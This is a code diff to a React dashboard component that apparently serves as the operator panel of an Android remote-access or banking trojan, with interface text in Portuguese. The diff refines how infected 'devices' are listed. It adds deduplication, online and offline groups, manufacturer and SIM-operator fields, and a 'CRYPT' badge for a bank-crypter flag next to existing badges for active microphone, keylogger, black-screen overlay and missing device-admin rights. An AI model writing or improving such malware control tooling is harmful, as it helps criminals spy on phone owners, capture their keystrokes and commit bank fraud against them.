@@ -8,7 +8,6 @@ export default function Android() {
   const selectDevice = useStore(s => s.selectDevice);
   const deviceDetail = useStore(s => s.deviceDetail);
 
-  // Device selected — show detail or loading
   if (selectedId) {
     if (!deviceDetail) {
       return (
@@ -17,12 +16,20 @@ export default function Android() {
         </div>
       );
     }
-    // FIX BUG 6: onBack calls selectDevice(null) which now has a null guard in store
     return <DeviceDetail onBack={() => selectDevice(null)} />;
   }
 
-  const online  = devices.filter(d => onlineIds.has(d.device_id));
-  const offline = devices.filter(d => !onlineIds.has(d.device_id));
+  // Dedup by device_id before splitting online/offline
+  // (store already guarantees uniqueness, but be defensive)
+  const seen    = new Set();
+  const unique  = devices.filter(d => {
+    if (!d.device_id || seen.has(d.device_id)) return false;
+    seen.add(d.device_id);
+    return true;
+  });
+
+  const online  = unique.filter(d => onlineIds.has(d.device_id));
+  const offline = unique.filter(d => !onlineIds.has(d.device_id));
 
   return (
     <div className="fade-up">
@@ -30,10 +37,13 @@ export default function Android() {
         <div className="section-title" style={{ margin: 0 }}>
           <span className="section-icon">📱</span>Dispositivos Android
         </div>
-        <span className="pill pill-green">{online.length} ON</span>
+        <div className="row gap6">
+          <span className="pill pill-green">{online.length} ON</span>
+          <span className="pill pill-dim">{offline.length} OFF</span>
+        </div>
       </div>
 
-      {devices.length === 0 && (
+      {unique.length === 0 && (
         <div className="no-data" style={{ marginTop: 60 }}>
           <div style={{ fontSize: 48, marginBottom: 12 }}>📱</div>
           <div>Aguardando conexões...</div>
@@ -43,8 +53,28 @@ export default function Android() {
         </div>
       )}
 
-      {online.map(d  => <DeviceItem key={d.device_id} d={d} online onSelect={selectDevice} />)}
-      {offline.map(d => <DeviceItem key={d.device_id} d={d} online={false} onSelect={selectDevice} />)}
+      {online.length > 0 && (
+        <>
+          <div className="txt-xs txt-dim mb6" style={{ letterSpacing: 1, paddingLeft: 2 }}>
+            ● ONLINE — {online.length}
+          </div>
+          {online.map(d => (
+            <DeviceItem key={d.device_id} d={d} online onSelect={selectDevice} />
+          ))}
+        </>
+      )}
+
+      {offline.length > 0 && (
+        <>
+          <div className="txt-xs txt-dim mb6 mt10" style={{ letterSpacing: 1, paddingLeft: 2 }}>
+            ○ OFFLINE — {offline.length}
+          </div>
+          {offline.map(d => (
+            <DeviceItem key={d.device_id} d={d} online={false} onSelect={selectDevice} />
+          ))}
+        </>
+      )}
+
       <div style={{ height: 20 }} />
     </div>
   );
@@ -59,6 +89,7 @@ function DeviceItem({ d, online, onSelect }) {
     d.mic_active          && { label: 'MIC',    cls: 'pill-gold'   },
     d.keylogger_active    && { label: 'KEYLOG', cls: 'pill-red'    },
     d.black_screen_active && { label: 'BLACK',  cls: 'pill-dim'    },
+    d.banks_crypter       && { label: 'CRYPT',  cls: 'pill-purple' },
     (!d.admin_active && online) && { label: 'NO ADMIN', cls: 'pill-red' },
   ].filter(Boolean);
 
@@ -70,12 +101,21 @@ function DeviceItem({ d, online, onSelect }) {
         <div className="dev-item-sub">
           <span className={`dot ${online ? 'dot-green' : 'dot-red'}`} style={{ marginRight: 5 }} />
           {online ? 'DISPOSITIVO CONECTADO' : 'OFFLINE'}
-          {ip && <span style={{ marginLeft: 8, color: 'var(--gold-dark)', fontFamily: 'var(--mono)', fontSize: 11 }}>{ip}</span>}
+          {ip && (
+            <span style={{ marginLeft: 8, color: 'var(--gold-dark)', fontFamily: 'var(--mono)', fontSize: 11 }}>
+              {ip}
+            </span>
+          )}
         </div>
+        {d.manufacturer && (
+          <div className="txt-xs txt-dim mt2">{d.manufacturer}</div>
+        )}
         {badges.length > 0 && (
           <div className="dev-item-badges mt4">
             {badges.map((b, i) => (
-              <span key={i} className={`pill ${b.cls}`} style={{ fontSize: 9, padding: '1px 7px' }}>{b.label}</span>
+              <span key={i} className={`pill ${b.cls}`} style={{ fontSize: 9, padding: '1px 7px' }}>
+                {b.label}
+              </span>
             ))}
           </div>
         )}
@@ -85,9 +125,12 @@ function DeviceItem({ d, online, onSelect }) {
         <div className="txt-xs txt-dim mt4">Android {d.android_version || '?'}</div>
         <div className="mt4">
           <span className={`pill ${online ? 'pill-green' : 'pill-dim'}`} style={{ fontSize: 9, padding: '2px 8px' }}>
-            {d.days_since_install || 0} dias
+            {d.days_since_install || 0}d
           </span>
         </div>
+        {d.sim_operator && (
+          <div className="txt-xs txt-dim mt4" style={{ fontSize: 9 }}>{d.sim_operator}</div>
+        )}
       </div>
     </div>
   );
